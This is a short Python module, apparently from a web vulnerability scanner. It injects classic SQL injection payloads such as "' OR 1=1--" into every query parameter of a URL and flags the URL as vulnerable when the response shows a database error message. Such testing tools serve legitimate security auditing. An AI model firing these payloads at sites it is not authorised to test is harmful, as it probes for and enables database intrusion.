# sql_injection.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error"
]

def inject_payload(url, payload):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return None  # No parameters to test

    # Inject payload into all query params
    injected_params = {k: payload for k in query_params}
    new_query = urlencode(injected_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    return new_url

def check_sql_injection(url):
    for payload in SQLI_PAYLOADS:
        test_url = inject_payload(url, payload)
        if not test_url:
            continue

        try:
            res = requests.get(test_url, timeout=10)
            for err in SQL_ERRORS:
                if err.lower() in res.text.lower():
                    return {
                        "status": "vulnerable",
                        "payload": payload,
                        "url": test_url,
                        "severity": "critical"
                    }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e),
                "severity": "unknown"
            }

    return {
        "status": "safe",
        "severity": "low"
    }
